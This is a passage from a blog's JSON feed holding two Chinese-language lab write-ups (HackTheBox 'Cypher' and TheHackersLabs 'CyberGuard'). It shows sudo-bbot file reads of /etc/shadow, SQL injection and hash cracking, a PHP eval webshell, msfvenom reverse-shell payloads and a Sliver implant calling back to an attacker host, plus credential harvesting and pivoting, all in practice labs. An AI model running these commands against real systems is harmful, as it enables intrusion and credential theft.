/home/graphasm/bbot_scans\n\nconfig:\n  modules:\n    neo4j:\n      username: neo4j\n      password: cU4btyib.20xtCMCXkBmerhK\n```\n\nä½†æ˜¯ä½¿ç”¨`neo4j`ç™»é™†ä¸æˆåŠŸï¼Œå¯†ç ç¢°æ’ä½¿ç”¨`graphasm`ç™»é™†æˆåŠŸ\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/cypher î‚° ssh graphasm@10.10.11.57                            \ngraphasm@10.10.11.57's password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Sun Mar  2 03:13:58 PM UTC 2025\n\n  System load:  0.0               Processes:             243\n  Usage of /:   74.2% of 8.50GB   Users logged in:       1\n  Memory usage: 66%               IPv4 address for eth0: 10.10.11.57\n  Swap usage:   0%\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Mar 2 15:13:59 2025 from 10.10.16.34\ngraphasm@cypher:~$ \n```\n\nåœ¨å®¶ç›®å½•ä¸‹å¯ä»¥è¯»å–`UserFlag`\n\n```bash\ngraphasm@cypher:~$ cat user.txt \n63a155f3be93bac8eec086ec22459b65\n```\n\næŸ¥çœ‹graphasmç”¨æˆ·æƒé™\n\n```bash\ngraphasm@cypher:~$ sudo -l\nMatching Defaults entries for graphasm on cypher:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser graphasm may run the following commands on cypher:\n    (ALL) NOPASSWD: /usr/local/bin/bbot\n```\n\næŸ¥çœ‹`bbot`å¸®åŠ©\n\n```bash\ngraphasm@cypher:~$ sudo /usr/local/bin/bbot   \n  ______  _____   ____ _______               \n |  ___ \\|  __ \\ / __ \\__   __|                                                                                                                                                                                    \n | |___) | |__) | |  | | | |                                                                             \n |  ___ <|  __ <| |  | | | |                  \n | |___) | |__) | |__| | | |                                                                             \n |______/|_____/ \\____/  |_|                                                                             \n BIGHUGE BLS OSINT TOOL v2.1.0.4939rc                                                                    \n                                                                                                         \nwww.blacklanternsecurity.com/bbot                                                                        \n                                                                                                         \nusage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]\n            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]\n            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]\n            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]\n                                                    \nBighuge BLS OSINT Tool                                                                                   \n                                                                                                         \noptions:                                                                                                 \n  -h, --help            show this help message and exit\n                                                                                                         \nTarget:                \n  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]                             \n                        Targets to seed the scan\n  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]\n                        What's considered in-scope (by default it's the same as --targets)\n  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]\n                        Don't touch these things                                                         \n  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope                                                                                                                               \n                                                                                                         \nPresets:                                           \n  -p [PRESET ...], --preset [PRESET ...]                                                                 \n                        Enable BBOT preset(s)                                                            \n  -c [CONFIG ...], --config [CONFIG ...]                                                                                                                                                                           \n                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'    \n  -lp, --list-presets   List available presets.     \n                                                                                                         \nModules:                                                                                                 \n  -m MODULE [MODULE ...], --modules MODULE [MODULE ...]                                                  \n                        Modules to enable. Choices: dnsbrute,paramminer_headers,github_org,ipneighbor,chaos,securitytxt,viewdns,baddns,ip2location,wpscan,bypass403,generic_ssrf,certspotter,urlscan,badsecrets,cre\ndshed,dastardly,asn,postman_download,virustotal,columbus,ntlm,c99,internetdb,httpx,git_clone,trufflehog,bucket_file_enum,subdomaincenter,filedownload,github_workflows,code_repository,trickest,fingerprintx,newsle\ntters,ffuf,anubisdb,crt,bucket_firebase,nuclei,portscan,unstructured,bucket_amazon,pgp,ffuf_shortnames,paramminer_cookies,azure_tenant,censys,dnscommonsrv,zoomeye,securitytrails,bucket_digitalocean,azure_realm,i\nis_shortnames,bucket_azure,binaryedge,dnscaa,wayback,affiliates,url_manipulation,gowitness,otx,docker_pull,github_codesearch,telerik,gitlab,secretsdb,dnsbrute_mutations,myssl,emailformat,digitorus,paramminer_get\nparams,bevigil,fullhunt,vhost,oauth,hunt,dnsdumpster,passivetotal,baddns_zone,host_header,sitedossier,shodan_dns,bucket_google,social,wappalyzer,wafw00f,leakix,hackertarget,rapiddns,sslcert,git,robots,dotnetnuke\n,skymem,baddns_direct,smuggler,builtwith,ipstack,postman,dehashed,hunterio,ajaxpro,dockerhub             \n  -l, --list-modules    List available modules.                                                                                                                                                                    \n  -lmo, --list-module-options                                                                            \n                        Show all module config options        \n  -em MODULE [MODULE ...], --exclude-modules MODULE [MODULE ...]                                         \n                        Exclude these modules.\n  -f FLAG [FLAG ...], --flags FLAG [FLAG ...]\n                        Enable modules by flag. Choices: iis-shortnames,social-enum,service-enum,portscan,web-screenshots,slow,subdomain-enum,affiliates,web-thorough,safe,cloud-enum,web-paramminer,active,baddns,\ndeadly,aggressive,code-enum,subdomain-hijack,passive,web-basic,report,email-enum                         \n  -lf, --list-flags     List available flags. \n  -rf FLAG [FLAG ...], --require-flags FLAG [FLAG ...]                                                   \n                        Only enable modules with these flags (e.g. -rf passive)                          \n  -ef FLAG [FLAG ...], --exclude-flags FLAG [FLAG ...]                                                   \n                        Disable modules with these flags. (e.g. -ef aggressive)                          \n  --allow-deadly        Enable the use of highly aggressive modules                                      \n                                                                                                         \nScan:                                                                                                                                                                                                              \n  -n SCAN_NAME, --name SCAN_NAME                                                                                                                                                                                   \n                        Name of scan (default: random)                                                                                                                                                             \n  -v, --verbose         Be more verbose                                                                                                                                                                            \n  -d, --debug           Enable debugging            \n  -s, --silent          Be quiet                                                                         \n  --force               Run scan even in the case of condition violations or failed module setups        \n  -y, --yes             Skip scan confirmation prompt                                                    \n  --dry-run             Abort before executing scan                                                      \n  --current-preset      Show the current preset in YAML format                                           \n  --current-preset-full\n                        Show the current preset in its full form, including defaults\n                                                    \nOutput:                                                                                                  \n  -o DIR, --output-dir DIR                                                                               \n                        Directory to output scan results             \n  -om MODULE [MODULE ...], --output-modules MODULE [MODULE ...]                                          \n                        Output module(s). Choices: csv,discord,splunk,websocket,subdomains,txt,teams,emails,http,neo4j,asset_inventory,stdout,web_report,python,slack,json                                         \n  --json, -j            Output scan data in JSON format   \n  --event-types EVENT_TYPES [EVENT_TYPES ...]                                                            \n                        Choose which event types to display                                              \n                                                                                                                                                                                                                   \nModule dependencies:                                                                                     \n  Control how modules install their dependencies    \n                                                                                                         \n  --no-deps             Don't install module dependencies                                                \n  --force-deps          Force install all module dependencies                                            \n  --retry-deps          Try again to install failed module dependencies                                                                                                                                            \n  --ignore-failed-deps  Run modules even if they have failed dependencies                                                                                                                                          \n  --install-all-deps    Install dependencies for all modules                                                                                                                                                       \n                                                                                                                                                                                                                   \nMisc:                                                                                                                                                                                                              \n  --version             show BBOT version and exit                                                       \n  -H CUSTOM_HEADERS [CUSTOM_HEADERS ...], --custom-headers CUSTOM_HEADERS [CUSTOM_HEADERS ...]                                                                                                                     \n                        List of custom headers as key value pairs (header=value).                        \n  --custom-yara-rules CUSTOM_YARA_RULES, -cy CUSTOM_YARA_RULES\n                        Add custom yara rules to excavate                                                \n                                                    \nEXAMPLES                                     \n                                                                                                                                                                                                                   \n    Subdomains:                                                                                          \n        bbot -t evilcorp.com -p subdomain-enum\n                                                                                                         \n    Subdomains (passive only):                                                                           \n        bbot -t evilcorp.com -p subdomain-enum -rf passive                                               \n                                                                                                         \n    Subdomains + port scan + web screenshots:                                                            \n        bbot -t evilcorp.com -p subdomain-enum -m portscan gowitness -n my_scan -o .                     \n                                                                                                                                                                                                                   \n    Subdomains + basic web scan:                                                                                                                                                                                   \n        bbot -t evilcorp.com -p subdomain-enum web-basic                                                                                                                                                           \n                                                                                                                                                                                                                   \n    Web spider:                                     \n        bbot -t www.evilcorp.com -p spider -c web.spider_distance=2 web.spider_depth=2                   \n                                                                                                         \n    Everything everywhere all at once:                                                                   \n        bbot -t evilcorp.com -p kitchen-sink                                                             \n                                                                                                         \n    List modules:      \n        bbot -l                                                                                          \n                                                    \n    List presets:                                                                                        \n        bbot -lp                                                                                         \n                                                                                                         \n    List flags:                                                                                          \n        bbot -lf                                                                                        \n```\n\næ„é€ ä»»æ„æ–‡ä»¶è¯»å–\n\nè¯»å–æ–‡ä»¶å¤§ç‚¹çš„æ–‡ä»¶ï¼Œå®¹æ˜“çœ‹è§è¾“å‡º\n\n```bash\ngraphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /etc/shadow -d \n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image34.png)\n\nè¯»å–`root.txt`\n\n```bash\ngraphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d \n```\n\n```bash\n63582a9da70699c87d6bd78e92aa9a71\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image35.png)\n",
            "url": "https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher",
            "title": "HackTheBox - Season7 - Cypher",
            "summary": "Season7 Cypher https://app.hackthebox.com/machines/Cypher | Linux Â· Medium å‰æœŸè¸©ç‚¹ 10.10.11.57 æ˜¯é¶æœº å‘ç°åŸŸå http://cypher.htb/ æ·»åŠ åˆ°hostsæ–‡ä»¶ æ‰«æUDPç«¯å£ æ‰«æä¸€ä¸‹å­åŸŸå è®¿é—®H...",
            "date_modified": "2025-04-04T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linuxé¶æœº"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard",
            "content_html": "\n# CyberGuard\n\n> https://labs.thehackerslabs.com/machine/25\n> \n\n![image.png](/post-images/TheHackersLabsCyberGuard/image.png)\n\nä¸€å…±æœ‰å››å°æœºå­ï¼šç¬¬ä¸€å°æ˜¯åšè·¯ç”±å™¨/é˜²ç«å¢™ã€‚å…¶ä½™ä¸‰å°å†…ç½‘ä¸»æœºã€‚\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image1.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  CyberGuard nmap -sn 10.0.2.0/24                   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report for 10.0.2.1\nHost is up (0.00072s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report for 10.0.2.10\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 10.0.2.20\nHost is up.\nNmap done: 256 IP addresses (3 hosts up) scanned in 2.21 seconds\n```\n\n```bash\nâœ  CyberGuard nmap -sT -min-rate 10000 -p- 10.0.2.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report for 10.0.2.10\nHost is up (0.0013s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.54 seconds\n```\n\n```bash\nâœ  CyberGuard nmap -sT -A -p 80 10.0.2.10                                                       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:12 CST\nNmap scan report for 10.0.2.10\nHost is up (0.00056s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx\n|_http-title: Site doesn't have a title (application/octet-stream, text/plain; charset=UTF-8).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): FreeBSD 11.X (92%)\nOS CPE: cpe:/o:freebsd:freebsd:11.2\nAggressive OS guesses: FreeBSD 11.2-RELEASE (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 10.0.2.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.56 seconds\n```\n\n### æšä¸¾\n\n`HTTP` æœåŠ¡\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image2.png)\n\nç›®å½•çˆ†ç ´ï¼Œè¿™é‡Œæ‰«æä¹…äº†ä¼šè¢« ban æ‰\n\n```bash\nâœ  CyberGuard gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.0.2.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.0.2.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 274]\n/index.php            (Status: 200) [Size: 1048]\n/search               (Status: 200) [Size: 2046]\n/admin                (Status: 302) [Size: 378] [--> http://10.0.2.10/admin/auth/login]\n/up                   (Status: 200) [Size: 2130]\n```\n\nè¿™ä¸ª `query` å’Œè¾“å‡ºç»“æœæ„Ÿè§‰æœ‰è‚¡ç†Ÿæ‚‰çš„å‘³\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image3.png)\n\n`sqlmap` è·‘ä¸€æ³¢\n\n```bash\nsqlmap -r packet -batch --level 3 --risk 3\n```\n\nçœŸè·‘å‡ºæ¥äº†ï¼Œåœ¨ `UA` ä¸­å­˜åœ¨æ³¨å…¥ç‚¹\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image4.png)\n\n## SQL Injection\n\nä½¿ç”¨ `sqlmap` ç›´æ¥å…¨ç»™çˆ†å‡ºæ¥\n\n```bash\ncurrent database: 'cyberguard\ncurrent user: 'ian@localhost'\n\n+------------------------+\n| cache                  |\n| admin_menu             |\n| admin_operation_log    |\n| admin_permissions      |\n| admin_role_menu        |\n| admin_role_permissions |\n| admin_role_users       |\n| admin_roles            |\n| admin_user_permissions |\n| admin_users            |\n| blacklist_user_agents  |\n| cache_locks            |\n| failed_jobs            |\n| job_batches            |\n| jobs                   |\n| migrations             |\n| password_reset_tokens  |\n| sessions               |\n| users                  |\n+------------------------+\n\n# admin_user\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| 1  | Administrator | NULL   | $2y$12$fN2GC9IgrwHneBpWIY8WwevYshq/qkEhoE6XhU7ClZInAhbW2YltK | admin    | 2024-10-01 17:41:30 | 2024-10-09 02:31:19 | NULL           |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n\n```\n\nçˆ†ç ´ä¸€ä¸‹å¯†ç \n\n```bash\nâœ  CyberGuard john --wordlist=/usr/share/wordlists/rockyou.txt hash       \nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nkiller           (?)     \n1g 0:00:00:04 DONE (2025-07-27 21:48) 0.2415g/s 34.78p/s 34.78c/s 34.78C/s shadow..sandra\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\nå¾—åˆ°æ˜æ–‡å¯†ç  `killer`\n\n## åå°åˆ©ç”¨\n\næ¥åˆ°ç½‘ç«™åå°å°è¯•è¿›è¡Œç™»å½•\n\næˆåŠŸè¿›å…¥åå°\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image5.png)\n\nåå°é‡Œé¢æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½ï¼ˆå›¾ä¸­çš„ `shell`ï¼‰\n\næˆåŠŸæ‰§è¡Œå‘½ä»¤\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image6.png)\n\nå†æ‹¿ `/etc/passwd` çš„ä¿¡æ¯ï¼Œèƒ½çŸ¥é“ `ian` ç”¨æˆ·æ˜¯å­˜åœ¨çš„\n\n```bash\nian:x:1000:1000:ian,,,:/home/ian:/bin/bash\n```\n\n### å°è¯• 1 âŒ\n\nå°è¯•åå¼¹ `shell` ï¼Œè¿™é‡Œä½¿ç”¨ `nc` å’Œ `/bin/bash` éƒ½æ— æ³•å¼¹å‡ºæ¥ï¼Œä¸€ç›´åœ¨åŠ è½½\n\nåå°è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ç‚¹ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ä¸Šä¼ çš„æ–‡ä»¶å¤¹åœ¨å“ª\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image7.png)\n\nå°è¯•ä½¿ç”¨å‘½ä»¤è¡Œæ¥æ‰¾åˆ°ä¸Šä¼ çš„æ–‡ä»¶å¤¹åœ¨å“ª\n\n```bash\nfind / -name 'result.php' 2>/dev/null\n```\n\né€šè¿‡ find å‘½ä»¤èƒ½æ‰¾åˆ°å­˜æ”¾åœ¨ `/var/www/cyberguard/storage/app/private/result.php`\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image8.png)\n\nå†çœ‹ä¸€ä¸‹å½“å‰ç›®å½•åœ¨å“ªï¼Œåœ¨ `/var/www/cyberguard/public`\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image9.png)\n\næˆ‘ä»¬åº”è¯¥æ˜¯æ²¡æœ‰åŠæ³•åˆ‡æ¢è¿‡å»\n\næ‰€ä»¥è¿™é‡Œå°è¯•ç›´æ¥å†™å…¥`webshell`\n\n```bash\necho '<?php eval($_POST[\"x\"]);phpinfo();?>' > test.php\n```\n\nå¯ä»¥æ‰§è¡Œå‘½ä»¤\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image10.png)\n\nä½†ç»“æœè¿˜æ˜¯æ— æ³•è¿›è¡Œåå¼¹ `shell` ï¼Œè¢«é˜»æ­¢\n\n### å°è¯• 2 âŒ\n\nå°è¯•ä½¿ç”¨ `MSF` æ¥æ‹¿åˆ° `shell`\n\n```bash\nâœ  CyberGuard msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.20 LPORT=4444 -f elf -o sunset\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of elf file: 250 bytes\nSaved as: sunset\n```\n\nä¸Šä¼ ååœ¨å‘½ä»¤æ‰§è¡Œçª—å£æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤\n\n```bash\nchmod +x /var/www/cyberguard/storage/app/private/sunset\n/var/www/cyberguard/storage/app/private/sunset\n```\n\nè¿™é‡Œè¿˜å°è¯•å¾ˆå¤šç§`payload` ï¼Œä¾‹å¦‚`cmd/linux/http/x64/meterpreter_reverse_http`  ç­‰\n\nä½†æ˜¯ç»“æœå’Œåœ¨ `WebShell` åå¼¹ä¸€æ ·ï¼Œè¢«é˜»æ­¢äº†\n\n### å°è¯• 3 âœ…\n\nè¿™é‡Œå°è¯•ä½¿ç”¨ `sliver` \n\n> https://github.com/BishopFox/sliver\n> \n\n`sliver` æœ‰å¾ˆé«˜çš„éšè”½æ€§å’Œå…æ€æ€§èƒ½ï¼Œå¹¶ä¸”ä¹Ÿæ”¯æŒå…¶ä»–çš„åè®®\n\n```bash\nâœ  CyberGuard sliver\nConnecting to localhost:31337 ...\n\n    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—\n    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—\n    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•\n    â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—\n    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘\n    â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•  â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•\n\nAll hackers gain persist\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\nsliver >  \n```\n\nä½¿ç”¨ `WireGuard` åè®®ç”Ÿæˆæ¤å…¥ç‰©å¹¶ç›‘å¬\n\n```bash\nsliver > generate --wg 10.0.2.20 -o linux -a amd64 -f binary\n\n[*] Generated unique ip for wg peer tun interface: 100.64.0.2\n[*] Generating new linux/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed in 1m12s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/FORMIDABLE_FLOOR\n\nsliver > wg\n\n[*] Starting Wireguard listener ...\n[*] Successfully started job #1\n```\n\nä¸Šä¼ åˆ°é¶æœºå¹¶è¿è¡Œ\n\n```bash\nchmod +x /var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n/var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n```\n\nç„¶åå¯ä»¥åœ¨ `sliver` æœåŠ¡ç«¯ä¸­çœ‹åˆ°è¿æ¥ä¸Šå»äº†\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image11.png)\n\nå’Œ `MSF` å·®ä¸å¤šçš„æ“ä½œ\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image12.png)\n\n## å†…ç½‘æ¸—é€\n\n### ä¿¡æ¯æ”¶é›†\n\næˆ‘ä»¬æŸ¥çœ‹ `databases.php` \n\n```bash\n'default' => [\n            'url' => env('REDIS_URL'),\n            'host' => env('REDIS_HOST', '127.0.0.1'),\n            'username' => env('REDIS_USERNAME'),\n            'password' => env('REDIS_PASSWORD'),\n            'port' => env('REDIS_PORT', '6379'),\n            'database' => env('REDIS_DB', '0'),\n        ],\n```\n\nå‘ç°æ•°æ®åº“å‡­æ®å­˜æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­\n\n```bash\nDB_PASSWORD=ZqBHR4MZ<f*+bv(J\nREDIS_HOST=127.0.0.1\nDB_HOST=127.0.0.1\nQUEUE_CONNECTION=database\n```\n\nå¾—åˆ°ä¸€ä¸²å¯†ç  `ZqBHR4MZ<f*+bv(J`\n\nç»è¿‡æµ‹è¯•æˆ‘ä»¬çŸ¥é“å¯†ç æ˜¯ `ian` è´¦æˆ·çš„\n\n```bash\n[*] Started remote shell with pid 1069\n\nwww-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ su ian\nPassword: \nian@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ \n```\n\næŸ¥çœ‹æ­£åœ¨ç›‘å¬çš„ç«¯å£\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ ss -tulpn\nNetid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                             \nudp   UNCONN 0      0            0.0.0.0:59645      0.0.0.0:*                                                       \nudp   UNCONN 0      0            0.0.0.0:51236      0.0.0.0:*    users:((\"ss\",pid=1098,fd=7),(\"bash\",pid=1082,fd=7))\nudp   UNCONN 0      0               [::]:51236         [::]:*    users:((\"ss\",pid=1098,fd=3),(\"bash\",pid=1082,fd=3))\ntcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                       \ntcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                                       \ntcp   LISTEN 0      128             [::]:22            [::]:*                                                       \ntcp   LISTEN 0      511                *:8080             *:*  \n```\n\næŸ¥çœ‹ `ip` ï¼Œå¾—åˆ°å†…ç½‘ç½‘æ®µ `10.20.30.0/24`\n\n```bash\nwww-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ ip add\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 08:00:27:f1:07:77 brd ff:ff:ff:ff:ff:ff\n    inet 10.20.30.11/24 brd 10.20.30.255 scope global enp0s3\n       valid_lft forever preferred_lft forever\n    inet6 fe80::a00:27ff:fef1:777/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n### æ­å»ºä»£ç†\n\næ–¹ä¾¿æ¸—é€å†…ç½‘ä¸»æœºï¼Œè¿™é‡Œä½¿ç”¨ `sliver`  æ­å»ºä»£ç†\n\næ–‡æ¡£é“¾æ¥ï¼šhttps://sliver.sh/docs?name=Reverse+SOCKS\n\nè¿™é‡Œä½¿ç”¨ `WireGuard SOCKS5`\n\n```bash\nsliver (FORMIDABLE_FLOOR) > info \n\n        Session ID: 160113c3-b76b-4b38-a5eb-a03335a7dbb8\n              Name: FORMIDABLE_FLOOR\n          Hostname: TheHackersLabs-2-Cyberguard\n              UUID: ed3dcaa8-d130-48be-8973-73101c3c3c31\n          Username: www-data\n               UID: 33\n               GID: 33\n               PID: 1053\n                OS: linux\n           Version: Linux TheHackersLabs-2-Cyberguard 6.1.0-25-amd64\n            Locale: C\n              Arch: amd64\n         Active C2: wg://10.0.2.20:53\n    Remote Address: 100.64.0.3:65311\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Mon Jul 28 12:49:33 CST 2025 (40m46s ago)\n      Last Checkin: Mon Jul 28 13:28:31 CST 2025 (1m48s ago)\n```\n\nåˆ›å»º `WireGuard` å®¢æˆ·ç«¯é…ç½®\n\n```bash\nsliver (FORMIDABLE_FLOOR) > wg-config\n\n[*] New client config:[Interface]\nAddress = 100.64.0.6/16\nListenPort = 51902\nPrivateKey = MLVcslgYICxAUJMnhPF/h6LAiqOfjh1vF38pZdOt20w=\nMTU = 1420\n\n[Peer]\nPublicKey = q36gtpUVlt9b9vCe4ZuM8+tU7zrDmN9SCAuSQ2jTYgQ=\nAllowedIPs = 100.64.0.0/16\nEndpoint = 10.0.2.20:53\n```\n\nä½¿ç”¨ `wg-quick` è¿›è¡Œè¿æ¥\n\n```bash\nâœ  CyberGuard vim wgsocks.conf\n```\n\n```bash\nâœ  CyberGuard wg-quick up wgsocks            \n[#] ip link add wgsocks type wireguard\n[#] wg setconf wgsocks /dev/fd/63\n[#] ip -4 address add 100.64.0.6/16 dev wgsocks\n[#] ip link set mtu 1420 up dev wgsocks\n```\n\nå†åœ¨ `sliver` ä¸­è¿è¡Œ `wg-socks`\n\n```bash\nsliver (FORMIDABLE_FLOOR) > wg-socks start\n\n[*] Started SOCKS server on 